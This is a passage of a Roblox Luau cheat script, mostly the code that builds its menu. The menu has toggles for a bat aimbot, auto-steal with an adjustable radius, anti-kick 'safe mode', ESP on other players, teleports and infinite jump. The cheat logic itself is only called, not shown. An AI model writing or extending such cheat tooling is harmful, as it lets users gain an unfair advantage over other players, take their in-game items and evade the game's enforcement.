		addToggleRow(combat, "BAT V2 (Macho Anti Bat)", flag14, 0, nil, function(arg)
			if arg then
				if tbl27 and tbl27.tryStart and not tbl27.tryStart() then
					return
				end
				tbl3.startBatV2()
			else
				tbl3.stopBatV2()
			end

			if tbl6.batV2 then
				local batV2 = tbl6.batV2
				local v5 = flag14
				local batV22

				if flag14 then
					batV22 = v5
				else
					batV22 = tbl3.batV2
				end

				batV2(batV22)
			end

			saveConfig()
		end)

		addInputRow(combat, "BAT V2 Speed", n7, 1, function(arg)
			n7 = math.clamp(tonumber(arg) or 56.5, 1, 200)
			saveConfig()
		end)

		addToggleRow(combat, "Mirror TP Down (Aimbot + BAT V2)", flag15, 2, nil, function(arg)
			flag15 = arg == true

			if not flag15 then
				pcall(function()
					table.clear(tbl4)
				end)
			end

			saveConfig()
		end)

		local v5, v6 = addToggleRow(combat, "Bat Aimbot", flag13, 1, nil, function(arg)
			if arg then
				if flag11 then
					flag11 = false
					stopAutoLeft()

					if v then
						v(false)
					end

					if tbl6.autoLeft then
						tbl6.autoLeft(false)
					end
				end

				if flag12 then
					flag12 = false
					stopAutoRight()

					if v2 then
						v2(false)
					end

					if tbl6.autoRight then
						tbl6.autoRight(false)
					end
				end

				queueAutoBatStart()

				if tbl6.autoBat then
					tbl6.autoBat(true)
				end
			else
				stopBatAimbot()

				if tbl6.autoBat then
					tbl6.autoBat(false)
				end
			end

			saveConfig()
		end)

		autoBatSetVisual = v6

		addToggleRow(combat, "Auto Swing", flag18, 2, nil, function(arg)
			flag18 = arg
			saveConfig()
		end)

		addToggleRow(combat, "Aimbot After Hit", flag16, 3, nil, function(arg)
			flag16 = arg
			saveConfig()
		end)

		local v7, v8 = addToggleRow(combat, "Bat Counter", flag7, 4, nil, function(arg)
			flag7 = arg

			if arg then
				startBatCounter()
			else
				stopBatCounter()
			end

			saveConfig()
		end)

		setBatCounterVisual = v8
		addSectLbl(combat, "RAGDOLL", 4)

		local v9, v10 = addToggleRow(combat, "Anti Ragdoll", flag4, 5, nil, function(arg)
			flag4 = arg

			if arg then
				startAntiRagdoll()
			else
				stopAntiRagdoll()
			end

			saveConfig()
		end)

		setAntiRagVisual = v10

		if flag4 then
			v10(true)
		end

		local v11, v12 = addToggleRow(combat, "Medusa Counter", flag6, 6, nil, function(arg)
			flag6 = arg

			if arg then
				setupMedusa(localPlayer.Character)
			else
				stopMedusaCounter()
			end

			saveConfig()
		end)

		setMedusaVisual = v12

		local v13, v14 = addToggleRow(combat, "Unwalk", flag8, 7, nil, function(arg)
			flag8 = arg

			if arg then
				startUnwalk()
			else
				stopUnwalk()
			end

			saveConfig()
		end)

		setUnwalkVisual = v14
		addSectLbl(combat, "PROTECTION", 13)

		addToggleRow(combat, "Anti Die + Fling", flag3, 13, nil, function(arg)
			flag3 = arg == true
			saveConfig()
		end)

		local v15, v16 = addToggleRow(combat, "Anti Kick / Safe Mode", tbl3.antiKick, 14, nil, function(arg)
			if arg then
				tbl3.antiKick = false
				tbl3.enableAntiKick()

				if tbl27 and tbl27.forceStop then
					tbl27.forceStop("SAFE MODE")
				end
			else
				tbl3.disableAntiKick()
			end

			if tbl3.setSafeModeVisual then
				tbl3.setSafeModeVisual(tbl3.antiKick)
			end

			saveConfig()
		end)

		tbl3.setAntiKickVisual = v16
		addSectLbl(combat, "TP BAT", 15)

		local v17, v18 = addToggleRow(combat, "TP Bat", tbl3.tpBat, 16, nil, function(arg)
			if arg then
				if tbl27 and tbl27.tryStart and not tbl27.tryStart() then
					if tbl3.setTPBatVisual then
						tbl3.setTPBatVisual(false)
					end

					if tbl6.tpBat then
						tbl6.tpBat(false)
					end

					return
				end

				tbl3.startTPBat()
			else
				tbl3.stopTPBat()
			end

			if tbl6.tpBat then
				tbl6.tpBat(arg and tbl3.tpBat)
			end
		end)

		tbl3.setTPBatVisual = v18
		addSectLbl(combat, "ACTIONS", 9)

		addActionRow(combat, "Drop Brainrot", nil, function()
			runDrop()
		end, 10)

		addActionRow(combat, "TP Down", nil, function()
			runTPFloor()
		end, 12)
	end

	fn28()

	local function fn29()
		local steal = tbl36.contents.Steal
		addSectLbl(steal, "AUTO STEAL", 0)

		addToggleRow(steal, "Auto Steal", tbl23.AutoStealEnabled, 1, nil, function(autoStealEnabled)
			tbl23.AutoStealEnabled = autoStealEnabled

			if autoStealEnabled then
				startAutoSteal()
			else
				stopAutoSteal()
			end

			saveConfig()
		end)

		addInputRow(steal, "Steal Radius", tbl23.StealRadius, 2, function(arg)
			tbl23.StealRadius = tonumber(arg) or 60
			saveConfig()
		end)

		addSectLbl(steal, "STEAL BAR STYLE", 2)
		local frame2 = Instance.new("Frame")
		frame2.Size = UDim2.new(1, -8, 0, 36)
		frame2.BackgroundTransparency = 1
		frame2.LayoutOrder = 3
		frame2.Parent = steal
		local uiListLayout = Instance.new("UIListLayout", frame2)
		uiListLayout.FillDirection = Enum.FillDirection.Horizontal
		uiListLayout.Padding = UDim.new(0, 8)
		uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
		local tbl37 = {}

		local function fn30()
			for k, v5 in pairs(tbl37) do
				local flag41 = n14 == k
				v5.BackgroundColor3 = flag41 and fn3() or Color3.fromRGB(16, 16, 20)
				v5.TextColor3 = flag41 and Color3.fromRGB(10, 10, 12) or Color3.fromRGB(210, 210, 220)
			end
		end

		for _, v5 in ipairs({ { id = 1, label = "1 · Vertical" }, { id = 2, label = "2 · Full" } }) do
			local textButton = Instance.new("TextButton")
			textButton.Size = UDim2.new(0, 110, 0, 30)
			textButton.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
			textButton.BorderSizePixel = 0
			textButton.Text = v5.label
			textButton.TextColor3 = Color3.fromRGB(230, 230, 235)
			textButton.Font = Enum.Font.GothamBold
			textButton.TextSize = 12
			textButton.AutoButtonColor = false
			textButton.Parent = frame2
			guiCorner(textButton, 8)
			guiStroke(textButton, Color3.fromRGB(50, 50, 58), 1)
			tbl37[v5.id] = textButton

			textButton.MouseButton1Click:Connect(function()
				n14 = v5.id
				fn30()
				pcall(createStealBar)
				saveConfig()
			end)
		end

		fn30()
		addSectLbl(steal, "STEAL BAR SIZE", 3)
		local frame3 = Instance.new("Frame")
		frame3.Size = UDim2.new(1, -8, 0, 36)
		frame3.BackgroundTransparency = 1
		frame3.LayoutOrder = 3
		frame3.Parent = steal
		local uiListLayout2 = Instance.new("UIListLayout", frame3)
		uiListLayout2.FillDirection = Enum.FillDirection.Horizontal
		uiListLayout2.Padding = UDim.new(0, 8)
		uiListLayout2.VerticalAlignment = Enum.VerticalAlignment.Center
		local textLabel = Instance.new("TextLabel", frame3)
		textLabel.Size = UDim2.new(0, 70, 0, 28)
		textLabel.BackgroundTransparency = 1
		textLabel.Text = string.format("%.0f%%", (tonumber(n15) or 1) * 100)
		textLabel.TextColor3 = Color3.fromRGB(230, 230, 235)
		textLabel.Font = Enum.Font.GothamBold
		textLabel.TextSize = 12.5
		textLabel.TextXAlignment = Enum.TextXAlignment.Left

		local function fn31(arg)
			n15 = math.clamp((tonumber(n15) or 1) + arg, 0.7, 1.8)
			textLabel.Text = string.format("%.0f%%", n15 * 100)
			pcall(createStealBar)
			saveConfig()
		end

		local textButton = Instance.new("TextButton", frame3)
		textButton.Size = UDim2.new(0, 36, 0, 28)
		textButton.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
		textButton.BorderSizePixel = 0
		textButton.Text = "-"
		textButton.TextColor3 = Color3.fromRGB(255, 255, 255)
		textButton.Font = Enum.Font.GothamBlack
		textButton.TextSize = 16
		textButton.AutoButtonColor = false
		guiCorner(textButton, 8)

		textButton.MouseButton1Click:Connect(function()
			fn31(-0.1)
		end)

		local textButton2 = Instance.new("TextButton", frame3)
		textButton2.Size = UDim2.new(0, 36, 0, 28)
		textButton2.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
		textButton2.BorderSizePixel = 0
		textButton2.Text = "+"
		textButton2.TextColor3 = Color3.fromRGB(255, 255, 255)
		textButton2.Font = Enum.Font.GothamBlack
		textButton2.TextSize = 16
		textButton2.AutoButtonColor = false
		guiCorner(textButton2, 8)

		textButton2.MouseButton1Click:Connect(function()
			fn31(0.1)
		end)

		local textButton3 = Instance.new("TextButton", frame3)
		textButton3.Size = UDim2.new(0, 64, 0, 28)
		textButton3.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
		textButton3.BorderSizePixel = 0
		textButton3.Text = "Reset"
		textButton3.TextColor3 = Color3.fromRGB(200, 200, 210)
		textButton3.Font = Enum.Font.GothamBold
		textButton3.TextSize = 11.5
		textButton3.AutoButtonColor = false
		guiCorner(textButton3, 8)

		textButton3.MouseButton1Click:Connect(function()
			n15 = 1
			textLabel.Text = "100%"
			pcall(createStealBar)
			saveConfig()
		end)

		addSectLbl(steal, "HOLD AT %", 4)
		local frame4 = Instance.new("Frame")
		frame4.Size = UDim2.new(1, -8, 0, 36)
		frame4.BackgroundTransparency = 1
		frame4.LayoutOrder = 5
		frame4.Parent = steal
		local uiListLayout3 = Instance.new("UIListLayout", frame4)
		uiListLayout3.FillDirection = Enum.FillDirection.Horizontal
		uiListLayout3.Padding = UDim.new(0, 6)
		uiListLayout3.HorizontalAlignment = Enum.HorizontalAlignment.Left
		uiListLayout3.VerticalAlignment = Enum.VerticalAlignment.Center
		uiListLayout3.SortOrder = Enum.SortOrder.LayoutOrder

		local tbl38 = {
			{ mode = 1, label = "90%" },
			{ mode = 2, label = "85%" },
			{ mode = 3, label = "80%" },
			{ mode = 4, label = "75%" },
		}

		local tbl39 = {}

		local function fn32()
			for _, v5 in ipairs(tbl38) do
				local v6 = tbl39[v5.mode]

				if v6 then
					local flag41 = tbl23.Mode == v5.mode
					v6.BackgroundColor3 = flag41 and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(18, 18, 22)
					v6.TextColor3 = flag41 and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(230, 230, 235)
				end
			end
		end

		for i, v5 in ipairs(tbl38) do
			local textButton4 = Instance.new("TextButton")
			textButton4.Size = UDim2.new(0, 58, 0, 30)
			textButton4.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
			textButton4.BorderSizePixel = 0
			textButton4.Text = v5.label
			textButton4.TextColor3 = Color3.fromRGB(230, 230, 235)
			textButton4.Font = Enum.Font.GothamBold
			textButton4.TextSize = 13
			textButton4.AutoButtonColor = false
			textButton4.LayoutOrder = i
			textButton4.Parent = frame4
			guiCorner(textButton4, 8)
			local uiStroke = Instance.new("UIStroke", textButton4)
			uiStroke.Color = Color3.fromRGB(50, 50, 55)
			uiStroke.Thickness = 1

			textButton4.MouseButton1Click:Connect(function()
				tbl23.Mode = v5.mode
				fn32()
				saveConfig()
			end)

			tbl39[v5.mode] = textButton4
		end

		fn32()
	end

	fn29()

	local function fn30()
		local movement = tbl36.contents.Movement

		task.spawn(function()
			task.wait(0.2)
			tbl3.antiKick = true

			if tbl3.enableAntiKick then
				tbl3.enableAntiKick()
			end
		end)

		addSectLbl(movement, "AUTO PATHS", 0)

		local v5, v6 = addToggleRow(movement, "Auto Left", flag11, 3, nil, function(arg)
			if arg then
				if tbl27 and tbl27.tryStart and not tbl27.tryStart() then
					if v then
						v(false)
					end

					if tbl6.autoLeft then
						tbl6.autoLeft(false)
					end

					return
				end

				if flag12 then
					flag12 = false
					stopAutoRight()

					if v2 then
						v2(false)
					end

					if tbl6.autoRight then
						tbl6.autoRight(false)
					end
				end

				if flag13 then
					stopBatAimbot()

					if autoBatSetVisual then
						autoBatSetVisual(false)
					end

					if tbl6.autoBat then
						tbl6.autoBat(false)
					end
				end

				flag11 = true
				startAutoLeft()

				if tbl6.autoLeft then
					tbl6.autoLeft(true)
				end
			else
				flag11 = false
				stopAutoLeft()

				if tbl6.autoLeft then
					tbl6.autoLeft(false)
				end
			end

			saveConfig()
		end)

		v = v6

		local v7, v8 = addToggleRow(movement, "Auto Right", flag12, 4, nil, function(arg)
			if arg then
				if tbl27 and tbl27.tryStart and not tbl27.tryStart() then
					if v2 then
						v2(false)
					end

					if tbl6.autoRight then
						tbl6.autoRight(false)
					end

					return
				end

				if flag11 then
					flag11 = false
					stopAutoLeft()

					if v then
						v(false)
					end

					if tbl6.autoLeft then
						tbl6.autoLeft(false)
					end
				end

				if flag13 then
					stopBatAimbot()

					if autoBatSetVisual then
						autoBatSetVisual(false)
					end

					if tbl6.autoBat then
						tbl6.autoBat(false)
					end
				end

				flag12 = true
				startAutoRight()

				if tbl6.autoRight then
					tbl6.autoRight(true)
				end
			else
				flag12 = false
				stopAutoRight()

				if tbl6.autoRight then
					tbl6.autoRight(false)
				end
			end

			saveConfig()
		end)

		v2 = v8
		addSectLbl(movement, "SETTINGS", 5)

		local v9, v10 = addToggleRow(movement, "Auto TP", flag22, 6, nil, function(arg)
			flag22 = arg

			if arg then
				startAutoTP()
			else
				stopAutoTP()
			end

			saveConfig()
		end)

		setAutoTPVisual = v10

		addInputRow(movement, "TP Height", autoTPHeight, 7, function(arg)
			if arg >= 0 and arg <= 500 then
				autoTPHeight = arg
			end

			saveConfig()
		end)

		local v11, v12 = addToggleRow(movement, "Infinite Jump", flag5, 8, nil, function(arg)
			flag5 = arg

			if arg then
				startHoldInfJump()
			else
				stopHoldInfJump()
			end

			saveConfig()
		end)

		setInfJumpVisual = v12
	end

	fn30()

	local function fn31()
		local visual = tbl36.contents.Visual
		addSectLbl(visual, "THEME COLOR", 0)
		local frame2 = Instance.new("Frame")
		frame2.Size = UDim2.new(1, -8, 0, 40)
		frame2.BackgroundTransparency = 1
		frame2.LayoutOrder = 1
		frame2.Parent = visual
		local uiListLayout = Instance.new("UIListLayout", frame2)
		uiListLayout.FillDirection = Enum.FillDirection.Horizontal
		uiListLayout.Padding = UDim.new(0, 6)
		uiListLayout.VerticalAlignment = Enum.VerticalAlignment.Center
		local tbl37 = {}

		local function fn32()
			for k, v5 in pairs(tbl37) do
				local flag41 = str == k
				v5.BackgroundColor3 = k == "RAINBOW" and Color3.fromRGB(255, 255, 255) or tbl5[k] or Color3.fromRGB(255, 255, 255)
				local uiStroke = v5:FindFirstChildOfClass("UIStroke")

				if uiStroke then
					uiStroke.Thickness = flag41 and 2.5 or 1
					uiStroke.Color = flag41 and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(60, 60, 70)
				end
			end

			pcall(function()
				if GuiRefs.machoTitle then
					if GuiRefs.machoTitle:IsA("ImageLabel") or GuiRefs.machoTitle:IsA("ImageButton") then
						GuiRefs.machoTitle.ImageColor3 = fn3()
					else
						GuiRefs.machoTitle.TextColor3 = fn3()
					end
				end
			end)
		end

		for _, v5 in ipairs({ "GREEN", "WHITE", "PURPLE", "BLUE", "RED", "PINK", "YELLOW", "GREY", "RAINBOW" }) do
			local textButton = Instance.new("TextButton")
			textButton.Size = UDim2.new(0, 30, 0, 30)
			textButton.BackgroundColor3 = tbl5[v5]
			textButton.BorderSizePixel = 0
			textButton.Text = ""
			textButton.AutoButtonColor = false
			textButton.Parent = frame2
			textButton:SetAttribute("ThemeSwatch", true)

			if v5 == "RAINBOW" then
				textButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
				local uiGradient = Instance.new("UIGradient", textButton)
				local colorSequence = ColorSequence.new
				local tbl38 = {}
				local v6 = ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 80, 80))
				local v7 = ColorSequenceKeypoint.new(0.2, Color3.fromRGB(255, 200, 70))
				local v8 = ColorSequenceKeypoint.new(0.4, Color3.fromRGB(90, 240, 140))
				local v9 = ColorSequenceKeypoint.new(0.6, Color3.fromRGB(80, 200, 255))
				local v10 = ColorSequenceKeypoint.new(0.8, Color3.fromRGB(150, 120, 255))
				local new = ColorSequenceKeypoint.new
				local color2 = Color3.fromRGB
				tbl38[1] = v6
				tbl38[2] = v7
				tbl38[3] = v8
				tbl38[4] = v9
				tbl38[5] = v10

				do
					local values = table.pack(new(1, color2(255, 110, 200)))
					table.move(values, 1, values.n, 6, tbl38)
				end

				uiGradient.Color = colorSequence(tbl38)
				uiGradient.Rotation = 30

				task.spawn(function()
					while textButton and textButton.Parent do
						uiGradient.Offset = Vector2.new(os.clock() * 0.25 % 2 - 1, 0)
						uiGradient.Rotation = 30 + math.sin(os.clock() * 0.8) * 12
						task.wait(0.03)
					end
				end)
			end

			guiCorner(textButton, 8)
			guiStroke(textButton, Color3.fromRGB(60, 60, 70), 1)
			tbl37[v5] = textButton

			textButton.MouseButton1Click:Connect(function()
				str = v5
				fn5()

				pcall(function()
					local v6 = fn3()

					if tbl36 and tbl36.btnsSide then
						for k, v7 in pairs(tbl36.btnsSide) do
							local flag41 = k == tbl36.active
							v7.BackgroundColor3 = flag41 and fn4(tbl30.row, v6, 0.14) or tbl30.row
							v7.BackgroundTransparency = flag41 and 0 or 0.22
							v7.TextColor3 = flag41 and Color3.fromRGB(255, 255, 255) or tbl30.textDim
							local indicators = tbl36.indicators and tbl36.indicators[k]

							if indicators then
								indicators.bar.BackgroundColor3 = v6

								if indicators.glow then
									indicators.glow.ImageColor3 = v6
								end
							end
						end
					end

					if GuiRefs and GuiRefs.inner then
						local uiStroke = GuiRefs.inner:FindFirstChildOfClass("UIStroke")

						if uiStroke then
							uiStroke.Color = v6
						end
					end

					if GuiRefs and GuiRefs.contentFrame then
						for _, descendant in ipairs(GuiRefs.contentFrame:GetDescendants()) do
							if descendant:IsA("Frame") or descendant:IsA("TextButton") then
								local backgroundColor3 = descendant.BackgroundColor3

								if backgroundColor3 then
									local n20 = backgroundColor3.R * 255
									local n21 = backgroundColor3.G * 255
									local n22 = backgroundColor3.B * 255

									if math.max(n20, n21, n22) - math.min(n20, n21, n22) > 40 and (n20 + n21 + n22) / 3 > 50 then
										descendant.BackgroundColor3 = v6
									end
								end
							end

							if descendant:IsA("UIStroke") then
								descendant.Color = v6
							end
						end
					end
				end)

				fn32()
				saveConfig()
			end)
		end

		fn32()

		task.defer(function()
			pcall(fn5)
		end)

		addSectLbl(visual, "CHARTER", 2)

		addToggleRow(visual, "Headless", flag29, 1, nil, function(arg)
			flag29 = arg == true

			pcall(function()
				applyHeadlessToChar(localPlayer.Character, flag29)
			end)

			saveConfig()
		end)

		addToggleRow(visual, "Korblox", flag30, 2, nil, function(arg)
			flag30 = arg == true

			pcall(function()
				applyKorbloxToChar(localPlayer.Character, flag30)
			end)

			saveConfig()
		end)

		addSectLbl(visual, "VISUAL", 0)

		addToggleRow(visual, "Speed ESP (Speed+Line+Chams)", flag34, 1, nil, function(arg)
			if arg then
				startESP()
			else
				stopESP()
			end

			saveConfig()
		end)

		addToggleRow(visual, "ESP Avatars", flag35, 2, nil, function(arg)
			flag35 = arg == true

			if not flag34 then
				flag35 = arg

				if espRefreshAvatars then
					espRefreshAvatars()
				end

				for _, label in pairs(tbl9.labels) do
					if label.avatarBillboard then
						pcall(function()
							label.avatarBillboard:Destroy()
						end)

						label.avatarBillboard = nil
					end
				end
			else
				if espRefreshAvatars then
					espRefreshAvatars()
				end

				if arg then
					for _, player in ipairs(Players:GetPlayers()) do
						if player ~= localPlayer then
							if not tbl9.labels[player] or not tbl9.labels[player].avatarBillboard then
								espMakeLabel(player)
							end
						end
					end
				else
					for _, label in pairs(tbl9.labels) do
						if label.avatarBillboard then
							label.avatarBillboard.Enabled = false
						end
					end
				end
			end

			saveConfig()
		end)

		addToggleRow(visual, "Ragdoll GUI", flag32, 6, nil, function(arg)
			flag32 = arg
			saveConfig()
		end)

		addSectLbl(visual, "ANIMATION PACK", 7)
		local n20 = 1

		for i, v5 in ipairs(tbl7) do
			if v5 == text2 then
				n20 = i
				break
			end
		end

		local frame3 = Instance.new("Frame")
		frame3.Size = UDim2.new(1, 0, 0, 40)
		frame3.BackgroundColor3 = tbl30.row
		frame3.BackgroundTransparency = 0.5
		frame3.BorderSizePixel = 0
		frame3.LayoutOrder = 8
		frame3.Parent = visual
		guiCorner(frame3, 10)
		guiStroke(frame3, tbl30.divider, 1)
		local textLabel = Instance.new("TextLabel", frame3)
		textLabel.Size = UDim2.new(0.42, 0, 1, 0)
		textLabel.Position = UDim2.new(0, 12, 0, 0)
		textLabel.BackgroundTransparency = 1
		textLabel.Text = "Anim Pack"
		textLabel.TextColor3 = tbl30.text
		textLabel.TextSize = 12.5
		textLabel.Font = Enum.Font.GothamBold
		textLabel.TextXAlignment = Enum.TextXAlignment.Left
		local textLabel2 = Instance.new("TextLabel", frame3)
		textLabel2.Size = UDim2.new(0, 90, 1, 0)
		textLabel2.Position = UDim2.new(1, -156, 0, 0)
		textLabel2.BackgroundTransparency = 1
		textLabel2.Text = text2
		textLabel2.TextColor3 = tbl30.textDim
		textLabel2.TextSize = 11
		textLabel2.Font = Enum.Font.GothamBold
		textLabel2.TextXAlignment = Enum.TextXAlignment.Right
		local textButton = Instance.new("TextButton", frame3)
		textButton.Size = UDim2.new(0, 50, 0, 24)
		textButton.Position = UDim2.new(1, -58, 0.5, -12)
		textButton.BackgroundColor3 = tbl30.blue
		textButton.BackgroundTransparency = 0.5
		textButton.BorderSizePixel = 0
		textButton.Text = "Next"
		textButton.TextColor3 = tbl30.white
		textButton.TextSize = 11
		textButton.Font = Enum.Font.GothamBold
		guiCorner(textButton, 5)

		textButton.MouseButton1Click:Connect(function()
			n20 = n20 % #tbl7 + 1
			text2 = tbl7[n20]
			textLabel2.Text = text2
			flag28 = text2 ~= "OFF"
			applyAnimPack(text2)
			saveConfig()
		end)

		addToggleRow(visual, "Anim Pack Enabled", flag28, 9, nil, function(arg)
			flag28 = arg

			if arg then
				applyAnimPack(text2)
			else
				fn22(localPlayer.Character)
			end

			saveConfig()
		end)

		addSectLbl(visual, "SKY THEME", 8)
		local n21 = 1

		for i, v5 in ipairs(tbl2) do
			if v5 == text then
				n21 = i
				break
			end
		end

		local frame4 = Instance.new("Frame")
		frame4.Size = UDim2.new(1, 0, 0, 40)
		frame4.BackgroundColor3 = tbl30.row
		frame4.BackgroundTransparency = 0.5
		frame4.BorderSizePixel = 0
		frame4.LayoutOrder = 9
		frame4.Parent = visual
		guiCorner(frame4, 10)
		guiStroke(frame4, tbl30.divider, 1)
		local textLabel3 = Instance.new("TextLabel", frame4)
		textLabel3.Size = UDim2.new(0.45, 0, 1, 0)
		textLabel3.Position = UDim2.new(0, 12, 0, 0)
		textLabel3.BackgroundTransparency = 1
		textLabel3.Text = "Sky Theme"
		textLabel3.TextColor3 = tbl30.text
		textLabel3.TextSize = 12.5
		textLabel3.Font = Enum.Font.GothamBold
		textLabel3.TextXAlignment = Enum.TextXAlignment.Left
		local textLabel4 = Instance.new("TextLabel", frame4)
		textLabel4.Size = UDim2.new(0, 80, 1, 0)
		textLabel4.Position = UDim2.new(1, -136, 0, 0)
		textLabel4.BackgroundTransparency = 1
		textLabel4.Text = text
		textLabel4.TextColor3 = tbl30.textDim
		textLabel4.TextSize = 11
		textLabel4.Font = Enum.Font.GothamBold
		textLabel4.TextXAlignment = Enum.TextXAlignment.Right
		local textButton2 = Instance.new("TextButton", frame4)
		textButton2.Size = UDim2.new(0, 46, 0, 24)
		textButton2.Position = UDim2.new(1, -54, 0.5, -12)
		textButton2.BackgroundColor3 = tbl30.blue
		textButton2.BackgroundTransparency = 0.5
		textButton2.BorderSizePixel = 0
		textButton2.Text = "Next"
		textButton2.TextColor3 = tbl30.white
		textButton2.TextSize = 11
		textButton2.Font = Enum.Font.GothamBold
		guiCorner(textButton2, 5)

		textButton2.MouseButton1Click:Connect(function()
			n21 = n21 % #tbl2 + 1
			text = tbl2[n21]
			textLabel4.Text = text
			CandyApplyCustomSky(text)
			saveConfig()
		end)

		local textButton3 = Instance.new("TextButton", frame4)
		textButton3.Size = UDim2.new(1, 0, 1, 0)
		textButton3.BackgroundTransparency = 1
		textButton3.Text = ""
		textButton3.ZIndex = 0

		textButton3.MouseEnter:Connect(function()
			tw(frame4, { BackgroundTransparency = 0.3 })
		end)

		textButton3.MouseLeave:Connect(function()
			tw(frame4, { BackgroundTransparency = 0.5 })
		end)

		local textButton4 = Instance.new("TextButton", fovRow)
		textButton4.Size = UDim2.new(1, 0, 1, 0)
		textButton4.BackgroundTransparency = 1
		textButton4.Text = ""
		textButton4.ZIndex = 0

		textButton4.MouseEnter:Connect(function()
			tw(fovRow, { BackgroundTransparency = 0.3 })
		end)

		textButton4.MouseLeave:Connect(function()
			tw(fovRow, { BackgroundTransparency = 0.5 })
		end)

		addSectLbl(visual, "GUI SIZE / SCALE", 17)

		local function createTextLabel(parent, text3, layoutOrder, arg, arg2, arg3, arg4, arg5, arg6)
			local frame5 = Instance.new("Frame")
			frame5.Size = UDim2.new(1, 0, 0, 40)
			frame5.BackgroundColor3 = tbl30.row
			frame5.BackgroundTransparency = 0.5
			frame5.BorderSizePixel = 0
			frame5.LayoutOrder = layoutOrder
			frame5.Parent = parent
			guiCorner(frame5, 10)
			guiStroke(frame5, tbl30.divider, 1)
			local textLabel5 = Instance.new("TextLabel", frame5)
			textLabel5.Size = UDim2.new(0.48, 0, 1, 0)
			textLabel5.Position = UDim2.new(0, 12, 0, 0)
			textLabel5.BackgroundTransparency = 1
			textLabel5.Text = text3
			textLabel5.TextColor3 = tbl30.text
			textLabel5.TextSize = 12.5
			textLabel5.Font = Enum.Font.GothamBold
			textLabel5.TextXAlignment = Enum.TextXAlignment.Left
			local textButton5 = Instance.new("TextButton", frame5)
			textButton5.Size = UDim2.new(0, 28, 0, 24)
			textButton5.Position = UDim2.new(1, -104, 0.5, -12)
			textButton5.BackgroundColor3 = tbl30.blue
			textButton5.BackgroundTransparency = 0.5
			textButton5.BorderSizePixel = 0
			textButton5.Text = "-"
			textButton5.TextColor3 = tbl30.white
			textButton5.TextSize = 16
			textButton5.Font = Enum.Font.GothamBold
			guiCorner(textButton5, 5)
			local textLabel6 = Instance.new("TextLabel", frame5)
			textLabel6.Size = UDim2.new(0, 42, 0, 24)
			textLabel6.Position = UDim2.new(1, -74, 0.5, -12)
			textLabel6.BackgroundTransparency = 1
			textLabel6.Text = arg3(arg())
			textLabel6.TextColor3 = tbl30.text
			textLabel6.TextSize = 12
			textLabel6.Font = Enum.Font.GothamBold
			textLabel6.TextXAlignment = Enum.TextXAlignment.Center
			local textButton6 = Instance.new("TextButton", frame5)
			textButton6.Size = UDim2.new(0, 28, 0, 24)
			textButton6.Position = UDim2.new(1, -30, 0.5, -12)
			textButton6.BackgroundColor3 = tbl30.blue
			textButton6.BackgroundTransparency = 0.5
			textButton6.BorderSizePixel = 0
			textButton6.Text = "+"
			textButton6.TextColor3 = tbl30.white
			textButton6.TextSize = 16
			textButton6.Font = Enum.Font.GothamBold
			guiCorner(textButton6, 5)

			local function fn33(arg7)
				local n22 = math.clamp(arg() + arg7, arg5, arg6)
				arg2(n22)
				textLabel6.Text = arg3(n22)
				saveConfig()
			end

			textButton5.MouseButton1Click:Connect(function()
				fn33(-arg4)
			end)

			textButton6.MouseButton1Click:Connect(function()
				fn33(arg4)
			end)

			local textButton7 = Instance.new("TextButton", frame5)
			textButton7.Size = UDim2.new(1, 0, 1, 0)
			textButton7.BackgroundTransparency = 1
			textButton7.Text = ""
			textButton7.ZIndex = 0

			textButton7.MouseEnter:Connect(function()
				tw(frame5, { BackgroundTransparency = 0.3 })
			end)

			textButton7.MouseLeave:Connect(function()
				tw(frame5, { BackgroundTransparency = 0.5 })
			end)

			return textLabel6
		end

		local frame5 = Instance.new("Frame", visual)
		frame5.Size = UDim2.new(1, 0, 0, 42)
		frame5.BackgroundColor3 = tbl30.row
		frame5.BackgroundTransparency = 0.5
		frame5.BorderSizePixel = 0
		frame5.LayoutOrder = 18
		guiCorner(frame5, 10)
		guiStroke(frame5, tbl30.divider, 1)
		local textLabel5 = Instance.new("TextLabel", frame5)
		textLabel5.Size = UDim2.new(0.38, 0, 1, 0)
		textLabel5.Position = UDim2.new(0, 12, 0, 0)
		textLabel5.BackgroundTransparency = 1
		textLabel5.Text = "GUI Scale"
		textLabel5.TextColor3 = tbl30.text
		textLabel5.TextSize = 12.5
		textLabel5.Font = Enum.Font.GothamBold
		textLabel5.TextXAlignment = Enum.TextXAlignment.Left
		local textLabel6 = Instance.new("TextLabel", frame5)
		textLabel6.Size = UDim2.new(0, 48, 0, 24)
		textLabel6.Position = UDim2.new(1, -114, 0.5, -12)
		textLabel6.BackgroundTransparency = 1
		textLabel6.Text = string.format("%.0f%%", uiScaleValue * 100)
		textLabel6.TextColor3 = tbl30.text
		textLabel6.TextSize = 12
		textLabel6.Font = Enum.Font.GothamBold
		textLabel6.TextXAlignment = Enum.TextXAlignment.Center
		local tbl38 = {}

		local function fn33(arg)
			for k, v5 in pairs(tbl38) do
				local flag41 = math.abs((tonumber(k) or 0) / 100 - arg) < 0.02
				v5.BackgroundColor3 = flag41 and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(18, 18, 22)
				v5.TextColor3 = flag41 and Color3.fromRGB(0, 0, 0) or Color3.fromRGB(230, 230, 235)
			end
		end

		local function fn34(arg)
			uiScaleValue = math.clamp(math.floor(arg * 100 + 0.5) / 100, 0.5, 1.8)

			if GuiRefs.outerScale then
				GuiRefs.outerScale.Scale = uiScaleValue
			end

			textLabel6.Text = string.format("%.0f%%", uiScaleValue * 100)
			fn33(uiScaleValue)
			saveConfig()
		end

		local textButton5 = Instance.new("TextButton", frame5)
		textButton5.Size = UDim2.new(0, 28, 0, 24)
		textButton5.Position = UDim2.new(1, -146, 0.5, -12)
		textButton5.BackgroundColor3 = tbl30.blue
		textButton5.BackgroundTransparency = 0.5
		textButton5.BorderSizePixel = 0
		textButton5.Text = "-"
		textButton5.TextColor3 = tbl30.white
		textButton5.TextSize = 16
		textButton5.Font = Enum.Font.GothamBold
		guiCorner(textButton5, 6)

		textButton5.MouseButton1Click:Connect(function()
